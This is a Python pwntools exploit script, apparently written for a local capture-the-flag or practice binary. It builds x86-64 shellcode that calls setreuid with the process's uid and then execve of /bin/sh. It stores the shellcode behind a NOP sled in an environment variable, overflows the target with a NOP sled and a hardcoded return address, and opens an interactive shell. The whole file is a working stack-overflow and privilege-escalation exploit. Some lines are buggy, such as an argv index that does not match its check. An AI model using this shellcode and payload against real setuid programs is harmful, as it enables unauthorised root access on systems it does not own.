#!/usr/bin/env python
from pwn import *

arch = 'x86-64'

shellcode = '''
    .att_syntax
    .att_mnemonic

    // write your assembly here

    push $0x6c 
    pop %rax
    syscall
                
    mov %rax, %rsi
    mov %rax, %rdi

    push $0x72
    pop %rax
    syscall

    xor %rsi, %rsi
    xor %rdx, %rdx
    push $0x3b
    pop %rax

    mov $0x68732f6e69622f2f, %rbx
    push %rsi
    push %rbx
    mov %rsp, %rdi

    syscall
'''

compiled = b'\x90'*8
compiled += asm(shellcode, arch=arch)

#compiled = 'A'*40

prog = './'
if len(sys.argv) == 2:
  prog += sys.argv[2]
else:
  prog += os.path.basename(os.getcwd())
  prog = prog[:2] + prog[5:]

target = process(prog, env={'EXP' : compiled})
#target = process(prog, setuid=False, env={'EXP' : compiled})

context.terminal = ['tmux', 'splitw', '-h']
#io = gdb.attach(target, 'b *input_func +64')


#################################################################################
# EXPLOIT                                                                       #
#######################################4##########################################
print(compiled)

# padding
padding = ''
for letter in 'a': #cdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ':
  padding += letter*8
padding = bytearray(padding, 'utf-8')

nop = b'\x90'*28

ret = b'\xb2\xef\xff\xff\xff\x7f\x00\x00'

payload = nop + ret
target.send(payload)
target.interactive()
